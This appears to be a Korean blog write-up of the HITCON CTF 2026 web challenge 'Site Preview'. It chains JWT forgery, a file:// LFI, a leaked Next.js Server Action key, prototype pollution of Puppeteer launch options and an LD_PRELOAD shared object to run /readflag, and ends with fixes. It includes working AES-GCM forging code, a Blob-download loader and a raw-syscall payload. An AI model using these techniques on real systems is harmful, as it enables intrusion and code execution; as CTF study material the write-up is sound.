---
title: "[HITCON CTF 2026] Site Preview"
date: 2026-10-26 00:27:00 +0900
categories: [CTF/Wargame]
tags: [ctf, web, nextjs, prototype-pollution, lfi]
---

- Category: Web
- Challenge: `Site Preview`
- Flag: `hitcon{finally_a_sufficiently_complicated_ctf_challenge_for_llm_assited_solving?}`

## 1. 개요

문제의 서비스는 사용자가 URL을 제출하면 reviewer가 Puppeteer로 사이트를 방문하고, 스크린샷을 생성하는 Next.js 애플리케이션이다.

최종 공격 흐름은 다음과 같다.

```text
RSA 개인키 복구
  → operator/reviewer JWT 위조
  → reviewer 전용 snapshot API의 file:// SSRF/LFI
  → Next.js Server Action 암호화 키 유출
  → 암호화된 closure bound argument 위조
  → Object.prototype pollution
  → Puppeteer의 downloadBehavior 및 env 옵션 오염
  → 악성 ELF 파일 다운로드
  → LD_PRELOAD를 이용한 코드 실행
  → /readflag give me the flag 실행
  → capture.log에서 flag 회수
```

핵심은 독립적으로는 제한적인 세 가지 취약점을 연결하는 것이다.

1. Puppeteer가 `file://` URL을 허용하여 로컬 파일을 스크린샷으로 읽을 수 있다.
2. Server Action closure의 암호화 키를 얻으면 원래 고정된 설정 경로를 위조할 수 있다.
3. 취약한 설정 경로 탐색을 통해 `Object.prototype`을 오염시키면 Puppeteer 실행 옵션까지 조작할 수 있다.

## 2. 사전 분석 자료

문제는 blackbox로 제공되었지만, 팀 분석 과정에서 다음 자료가 공유되었다.

- `backup.tar.gz`: 애플리케이션 소스 및 Dockerfile
- `private-key-top.jpg`, `private-key-middle.jpg`, `private-key-bottom.jpg`: RSA 개인키 조각 이미지
- OCR 결과:
  - `rsa_private_parameters.json`
  - `key_verification.json`
  - `recovered_private_key.pem`

복구된 개인키는 백업에 포함된 `.local/jwt-private`와 일치했고, 서버의 JWT 공개키로도 정상 검증되었다. 따라서 인증 우회는 키 혼동 공격이 아니라 정상적인 RS256 서명 위조로 진행했다.

## 3. 인증 구조와 JWT 위조

인증 코드는 대략 다음 구조였다.

```ts
const publicKey = readFileSync('.local/jwt-public')

jwt.verify(token, publicKey, {
  algorithms: ['RS256'],
  issuer: 'sitepreview',
  audience: 'sitepreview'
})
```

애플리케이션은 `token` 쿠키의 JWT를 검증하고 `reviewer`, `operator` 역할을 구분했다. 복구한 RSA 개인키로 다음 조건을 만족하는 JWT 두 개를 생성했다.

```json
{
  "role": "operator",
  "iss": "sitepreview",
  "aud": "sitepreview"
}
```

```json
{
  "role": "reviewer",
  "iss": "sitepreview",
  "aud": "sitepreview"
}
```

서명 알고리즘은 반드시 `RS256`을 사용했다. 이 토큰으로 각각 `/settings`와 `/api/snapshot`에 접근할 수 있었다.

## 4. Snapshot API의 `file://` LFI

Reviewer 전용 API는 전달받은 문자열을 별도 scheme 검사 없이 `URL` 객체로 변환했다.

```ts
export async function POST(request: Request) {
  if ((await getTokenRole()) !== 'reviewer')
    return Response.json({ error: 'Reviewer access is required.' }, { status: 403 })

  const { url } = await request.json()
  const image = await captureSnapshot(new URL(url))
  // ...
}
```

실제 캡처 함수도 URL을 그대로 Puppeteer에 전달했다.

```ts
const browser = await puppeteer.launch({
  args: ['--js-flags=--jitless', '--disable-dev-shm-usage'],
  executablePath
})

const page = await browser.newPage()
await page.setViewport(captureSettings.viewport)
await page.goto(url.href, { waitUntil: 'networkidle2' })
const image = await page.screenshot({ type: 'jpeg', quality: captureSettings.jpegQuality })
```

따라서 HTTP(S)뿐 아니라 로컬 파일도 열 수 있었다.

```http
POST /api/snapshot HTTP/1.1
Cookie: token=<REVIEWER_JWT>
Content-Type: application/json

{"url":"file:///app/.next/server/server-reference-manifest.js"}
```

JSON manifest는 길어서 화면 아래쪽의 키가 보이지 않았지만, 같은 내용을 한 줄 문자열로 보관하는 JavaScript manifest는 줄바꿈 문자가 `\n`으로 escape되어 있었다. 브라우저의 line wrap 덕분에 한 화면 안에서 파일 끝부분까지 확인할 수 있었다.

스크린샷 OCR로 얻은 Server Action 암호화 키는 다음과 같았다.

```text
BKqJucWnAOnICM6JbgNPJQz7goik1RUPFm5sd7XUTMw=
```

이 값은 Base64로 인코딩된 32바이트 AES 키다.

## 5. Next.js Server Action bound argument 분석

`/settings` 페이지는 각 설정마다 closure 형태의 Server Action을 생성했다.

```ts
const settingPath: string = path

async function updateSetting(value: unknown) {
  'use server'

  if ((await getTokenRole()) !== 'operator')
    return { status: 'error', output: 'Operator access is required.' }

  setSetting(settingPath.split('.'), value)
  return {
    status: 'success',
    output: `${settingPath} is now ${String(getSetting(settingPath.split('.')))}`
  }
}
```

여기서 `settingPath`는 closure에 묶인 값이므로 클라이언트로 전달될 때 암호화된 bound argument가 된다. 페이지의 RSC 데이터에서 `viewport.width`에 해당하는 암호문을 추출한 뒤 manifest에서 얻은 키로 AES-256-GCM 복호화했다.

복호화된 평문은 다음 형태였다.

```text
60c05f9a9e3260f33214c35f21a163fe847ef604680:["viewport.width"]
```

앞부분은 Server Action ID이며, 뒷부분은 React Flight 형식으로 직렬화된 bound argument다.

Next.js의 암호문 형식은 다음과 같았다.

```text
Base64(16-byte IV || AES-GCM ciphertext || 16-byte authentication tag)
```

따라서 평문의 `viewport.width`만 원하는 경로로 바꾸고 새로운 IV를 사용해 다시 암호화하면, 서버가 정상적으로 인증하는 임의의 bound argument를 만들 수 있다.

간단한 복호화·재암호화 코드는 다음과 같다.

```js
const crypto = require('node:crypto')

function decryptBoundArg(token, key) {
  const raw = Buffer.from(token, 'base64')
  const iv = raw.subarray(0, 16)
  const encrypted = raw.subarray(16)
  const tag = encrypted.subarray(-16)
  const ciphertext = encrypted.subarray(0, -16)

  const decipher = crypto.createDecipheriv('aes-256-gcm', key, iv)
  decipher.setAuthTag(tag)
  return Buffer.concat([decipher.update(ciphertext), decipher.final()]).toString()
}

function encryptBoundArg(plaintext, key) {
  const iv = crypto.randomBytes(16)
  const cipher = crypto.createCipheriv('aes-256-gcm', key, iv)
  const ciphertext = Buffer.concat([cipher.update(plaintext), cipher.final()])
  return Buffer.concat([iv, ciphertext, cipher.getAuthTag()]).toString('base64')
}
```

## 6. 설정 경로를 이용한 Prototype Pollution

설정 저장 로직은 경로의 각 component를 그대로 객체 property로 사용했다.

```ts
export const captureSettings = {
  viewport: { width: 1200, height: 750 },
  timeoutMs: 5000,
  jpegQuality: 80
}

function walk(path: string[]) {
  let target: any = captureSettings
  for (const key of path.slice(0, -1)) target = target[key]
  return target
}

export function setSetting(path: string[], value: unknown) {
  walk(path)[path.at(-1)!] = value
}
```

`__proto__`, `prototype`, `constructor` 같은 위험한 component를 차단하지 않는다. 위조한 bound argument를 사용하면 다음 동작이 가능하다.

```ts
setSetting(['__proto__', 'downloadBehavior'], value)
```

`captureSettings.__proto__`는 `Object.prototype`이므로 실제 결과는 다음과 같다.

```js
Object.prototype.downloadBehavior = value
```

동일한 방식으로 두 개의 property를 오염시켰다.

```text
__proto__.downloadBehavior
__proto__.env
```

첫 번째 요청의 개념적인 body는 다음과 같다.

```json
[
  "<FORGED_ENCRYPTED_BOUND_ARGUMENT>",
  {"policy":"allow","downloadPath":"/app"}
]
```

요청에는 설정 업데이트 Server Action ID가 사용되었다.

```http
POST /settings HTTP/1.1
Next-Action: 60c05f9a9e3260f33214c35f21a163fe847ef60468
Cookie: token=<OPERATOR_JWT>
Content-Type: text/plain;charset=UTF-8
Accept: text/x-component
```

서버 응답으로 실제 오염 성공을 확인할 수 있었다.

```text
__proto__.downloadBehavior is now [object Object].
```

## 7. Puppeteer 옵션 가젯

애플리케이션이 직접 넘기는 launch option에는 `downloadBehavior`나 `env`가 없다.

```ts
puppeteer.launch({
  args: ['--js-flags=--jitless', '--disable-dev-shm-usage'],
  executablePath: '/usr/bin/chromium-browser'
})
```

하지만 Puppeteer 내부의 `BrowserLauncher`는 일반 property 접근을 사용하는 구조 분해 할당을 수행한다.

```js
const {
  env = process.env,
  downloadBehavior,
  // ...
} = options
```

JavaScript property lookup은 own property가 없으면 prototype chain을 탐색한다. 따라서 오염된 `Object.prototype.downloadBehavior`와 `Object.prototype.env`가 Puppeteer의 실제 실행 옵션으로 사용된다.

이로써 다음 두 primitive를 얻었다.

- Chromium 다운로드 파일을 `/app`에 저장
- Chromium 프로세스의 환경변수를 임의로 지정

## 8. 악성 ELF 파일을 `/app`에 저장

처음에는 외부 URL에 `.so`를 올리고 Puppeteer가 해당 URL로 직접 이동하도록 했다. 그러나 다운로드 response를 받은 순간 `page.goto()`가 `net::ERR_ABORTED`를 반환했고, `finally`에서 브라우저가 즉시 종료되었다. 작은 파일조차 완전히 저장되기 전에 다운로드가 취소되어 `/app/*.so`가 존재하지 않았다.

이를 우회하기 위해 다음 방법을 사용했다.

1. preload용 ELF를 HTML 내부에 Base64로 삽입한다.
2. HTML을 정상적인 `text/html` 응답으로 제공한다.
3. JavaScript로 Base64를 Blob으로 변환한다.
4. `<a download>`를 클릭해 `/app/p3.so`로 저장한다.
5. busy loop로 브라우저가 바로 종료되지 않도록 잠시 유지한다.

Loader의 핵심 코드는 다음과 같다.

```html
<script>
const s = atob('<BASE64_ELF>')
const u = Uint8Array.from(s, c => c.charCodeAt())
const a = document.createElement('a')
a.href = URL.createObjectURL(new Blob([u]))
a.download = 'p3.so'
a.click()

const end = Date.now() + 3000
while (Date.now() < end) {}
</script>
```

HTML은 httpbin의 `/base64/<data>` endpoint를 이용해 `text/html`로 제공했다. 다만 HTTP request line 제한이 약 4094바이트였기 때문에 일반적인 GCC shared object는 너무 컸다.

최종 ELF는 다음 방식으로 약 1.4KB까지 줄였다.

- libc를 사용하지 않고 raw syscall만 사용
- `-nostdlib`
- 단일 RWX `LOAD` segment를 생성하는 `-Wl,-N`
- build ID 제거
- `strip -s`
- section header 등 런타임에 불필요한 뒷부분 제거

```bash
gcc -shared -fPIC -nostdlib \
  -Wl,-init,_init,--build-id=none,-N \
  -o payload.so preload.c

strip -s payload.so
truncate -s <LOAD_SEGMENT_END> payload.so
```

다운로드 후 다음 LFI 요청의 결과가 `ERR_FILE_NOT_FOUND`가 아니라 `ERR_ABORTED`로 바뀌어 파일 존재를 확인했다.

```text
file:///app/p3.so → net::ERR_ABORTED
```

바이너리 파일을 Chromium이 다시 다운로드 대상으로 처리했기 때문에 `ERR_ABORTED`가 발생한 것이며, 이 경우 파일 자체는 존재한다.

## 9. `LD_PRELOAD` RCE

두 번째 prototype pollution으로 Puppeteer의 `env`를 다음과 같이 만들었다.

```json
{
  "LD_PRELOAD": "/app/p3.so"
}
```

이후 reviewer 권한으로 새로운 snapshot을 요청하면 Puppeteer가 Chromium을 spawn한다. 동적 로더가 `/app/p3.so`를 로드하면서 ELF의 constructor가 실행된다.

최종 payload는 libc 없이 syscall만 사용했다.

```c
static long call3(long n, long a, long b, long c) {
  long r;
  __asm__ volatile(
    "syscall"
    : "=a"(r)
    : "a"(n), "D"(a), "S"(b), "d"(c)
    : "rcx", "r11", "memory"
  );
  return r;
}

static void run(void) {
  char log[] = "/app/log/capture.log";

  // open(log, O_WRONLY | O_APPEND, 0)
  long fd = call3(2, (long)log, 02001, 0);
  if (fd >= 0) {
    // stdout과 stderr를 capture.log로 연결
    call3(33, fd, 1, 0);
    call3(33, fd, 2, 0);
  }

  char path[] = "/readflag";
  char a1[] = "give";
  char a2[] = "me";
  char a3[] = "the";
  char a4[] = "flag";
  char *argv[] = {path, a1, a2, a3, a4, 0};
  char *envp[] = {0};

  // execve(path, argv, envp)
  call3(59, (long)path, (long)argv, (long)envp);
}

void _init(void) {
  run();
}
```

처음에는 인자 없이 `/readflag`를 실행했다. 이때 로그에서 다음 사용법을 확인했다.

```text
Usage: /readflag give me the flag
```

따라서 `argv`를 수정한 뒤 payload를 다시 저장하고 실행했다.

## 10. Flag 회수

Operator 설정 페이지에는 고정 경로 `/app/log/capture.log`를 읽는 별도의 Server Action이 있었다. 해당 action의 기존 bound argument를 그대로 사용해 로그를 읽었다.

응답은 Buffer가 React Flight 데이터로 직렬화된 형태였다.

```json
{
  "content": {
    "type": "Buffer",
    "data": [104, 105, 116, 99, 111, 110, 123, ...]
  }
}
```

숫자 배열을 byte string으로 변환하자 다음 내용이 확인되었다.

```text
PRELOAD_OK
hitcon{finally_a_sufficiently_complicated_ctf_challenge_for_llm_assited_solving?}
```

최종 flag:

```text
hitcon{finally_a_sufficiently_complicated_ctf_challenge_for_llm_assited_solving?}
```

## 11. 실패했던 접근과 디버깅 포인트

### 11.1 일반 JSON manifest 캡처

`server-reference-manifest.json`은 여러 줄로 pretty-print되어 있어 암호화 키가 viewport 아래에 있었다. viewport 높이 설정을 바꿔도 설정 action과 snapshot route가 서로 다른 module instance를 사용하는 문제로 반영되지 않았다.

해결 방법은 동일 내용을 한 physical line에 저장한 `server-reference-manifest.js`를 캡처하는 것이었다.

### 11.2 외부 `.so` URL로 직접 이동

Puppeteer는 다운로드가 시작되면 navigation을 `ERR_ABORTED`로 처리한다. 애플리케이션은 곧바로 `browser.close()`를 호출하므로 다운로드가 완료되지 않았다.

해결 방법은 정상 HTML 문서를 먼저 연 뒤, 문서 내부에서 Blob download를 발생시키고 실행 시간을 확보하는 것이었다.

### 11.3 `/readflag` 출력이 보이지 않음

단순히 `/readflag`를 `execve`하면 출력이 Puppeteer가 관리하는 child process pipe로 들어가 애플리케이션 로그에서 보이지 않았다.

해결 방법은 constructor에서 `capture.log`를 열고 stdout과 stderr를 해당 fd로 `dup2`한 다음 `/readflag`를 실행하는 것이었다.

### 11.4 `/readflag` 실행 인자

프로그램은 인자 없는 실행을 거부했다. stderr까지 로그로 연결해 두었기 때문에 정확한 사용법을 확인할 수 있었고, `give me the flag`를 `argv`로 전달해 해결했다.

## 12. 취약점별 개선 방안

### Snapshot API

- `http:`와 `https:` scheme만 허용한다.
- loopback, link-local, private network 및 DNS rebinding을 차단한다.
- Chromium을 애플리케이션과 분리된 비특권 sandbox/container에서 실행한다.
- 로컬 filesystem 접근과 다운로드를 금지한다.

### 설정 경로 처리

- 사용자 또는 복호화된 데이터에서 `__proto__`, `prototype`, `constructor`를 거부한다.
- 문자열 경로 탐색 대신 명시적인 allowlist와 switch 문을 사용한다.
- 설정 객체를 `Object.create(null)`로 만들거나 own property만 탐색한다.
- `Object.prototype`을 freeze하는 방어도 고려할 수 있다.

### Next.js Server Action

- Server Action 암호화 키가 유출되더라도 안전하도록 bound argument를 신뢰하지 않는다.
- action 내부에서 경로와 값의 type/range를 다시 검증한다.
- 빌드 산출물과 manifest가 브라우저에서 읽히지 않도록 filesystem 권한을 분리한다.

### 인증 키

- 컨테이너 이미지나 백업에 JWT signing private key를 포함하지 않는다.
- 런타임 secret store에서 주입하고 주기적으로 rotation한다.
- 운영 백업에 secret이 들어가지 않도록 별도 검증 절차를 둔다.

## 13. 결론

이 문제는 하나의 즉시 RCE 취약점이 아니라 여러 신뢰 경계의 실패를 연결해야 하는 체인형 문제였다. `file://` LFI만으로는 이미지 형태의 파일 열람에 그치고, Server Action 암호화 키만으로는 허용된 action 호출에 그친다. 그러나 closure argument 위조로 prototype pollution을 발생시키고, 이를 Puppeteer의 inherited option lookup과 연결하면서 파일 쓰기 및 환경변수 조작 primitive가 만들어졌다.

특히 Server Action의 암호화는 인자의 무결성을 제공할 뿐, 복호화된 값의 안전성을 보장하지 않는다. 최종적으로 중요한 방어 지점은 암호화 자체가 아니라 action 내부의 엄격한 allowlist 검증이다.
